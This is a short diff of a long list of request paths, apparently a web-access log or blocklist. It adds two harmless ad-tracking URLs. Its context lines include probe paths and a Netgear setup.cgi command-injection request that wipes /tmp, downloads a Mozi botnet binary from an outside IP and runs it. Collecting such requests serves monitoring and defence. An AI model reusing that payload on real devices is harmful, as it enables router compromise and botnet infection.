@@ -15135,3 +15135,5 @@ http://apiv4.9hits.com/test
 /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://84.214.103.101:2735/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1
 /yiwangxiao/imgpreview.php
 /assets/admin/lib/webuploader/0.1.5/server/preview.php
+/?gad_source=5&gclid=EAIaIQobChMI-5KVl6vxiwMVRVPdAh2d-QKPEAEYASAAEgLQW_D_BwE
+/?gad_source=5&gclid=EAIaIQobChMIs_SgxavxiwMV_5nYBR3WYzIoEAEYASAAEgJYq_D_BwE
